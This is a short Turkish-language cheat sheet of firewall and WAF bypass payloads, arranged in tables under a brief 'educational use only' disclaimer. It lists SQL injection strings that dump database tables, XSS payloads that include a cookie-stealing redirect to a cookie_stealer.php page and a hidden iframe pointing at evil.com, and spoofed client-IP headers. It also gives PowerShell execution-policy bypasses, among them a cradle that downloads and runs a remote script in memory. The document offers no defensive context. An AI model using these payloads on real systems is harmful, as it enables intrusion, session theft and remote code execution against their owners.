# Güvenlik Duvarı Atlatma Teknikleri

Aşağıda, farklı türlerdeki güvenlik duvarlarını aşma tekniklerinin örnekleri verilmiştir. Bu bilgiler yalnızca eğitim amaçlıdır ve yalnızca etik siber güvenlik uygulamalarında kullanılmalıdır.

## 1. SQL Enjeksiyonu Evasion Teknikleri

| Payload |
|---------|
| - ' OR 'a'='a |
| - ')) OR 'x'='x |
| - ' OR 1=1# |
| - ' OR 'x'='x |
| - -1 UNION SELECT 1,@@version -- + |
| - -1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1 -- + |
| - ' OR uname LIKE '%root% |
| - ' OR 'unusual' = 'unusual' |

## 2. HTTP Parametre Kirliliği (HPP) WAF Atlatma

| Payload |
|---------|
| - url&s1="><script>document.location='http://yourdomain.com/cookie_stealer.php?c='+document.cookie</script> |
| - url&s1="><iframe src="http://evil.com" width="0" height="0" /> |
| - url&s1="><img src=x onerror=alert(1)> |
| - url&s1="><svg/onload=alert(1)> |

## 3. IP Atlatma

| Payload |
|---------|
| - X-Real-IP: istenen ip adresi |
| - X-Client-IP: istenen ip adresi |
| - Client-IP: istenen ip adresi |
| - X-Cluster-Client-IP: istenen ip adresi |

## 4. Windows PowerShell Atlatma

| Payload |
|---------|
| - powershell.exe -ExecutionPolicy Bypass -File script.ps1 |
| - powershell -ep bypass -Command "& {Get-ExecutionPolicy}" |
| - powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://url/script.ps1')" |
| - powershell.exe -WindowStyle hidden {your script here} |
